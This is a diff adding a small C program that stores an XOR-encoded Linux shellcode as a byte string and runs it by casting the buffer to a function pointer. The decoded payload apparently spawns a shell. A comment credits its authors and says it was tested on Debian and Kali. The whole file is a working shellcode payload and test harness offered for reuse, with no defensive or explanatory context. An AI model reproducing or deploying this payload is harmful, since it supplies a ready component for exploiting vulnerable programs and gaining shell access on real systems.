@@ -1,0 +1,19 @@
+/*
+tested on : linux debian & Linux Kali <
+Sh33L C0d3. this code is the works of a Gunslinger , Now Kilo-411 Will implement it into the next genous code and change a little of the format it
+*/
+
+#include <stdio.h>
+
+char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x26\x80\x74\x0e\xff\x01"
+		   "\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff"
+		   "\x30\xc1\x30\xda\x30\xc8\x30\xd3\xb1\x47\x30\xda"
+		   "\x30\xc8\xcc\x81\xb1\x0a\x52\x69\x2e\x2e\x72\x69"
+		   "\x69\x2e\x63\x68\x6f\x88\xe2\x30\xc8\x30\xc8\x52"
+		   "\xcc\x81";
+		
+int main(void)
+{
+	fprintf(stdout,"Length: %d\n",strlen(shellcode));
+	(*(void(*)()) shellcode)();
+}
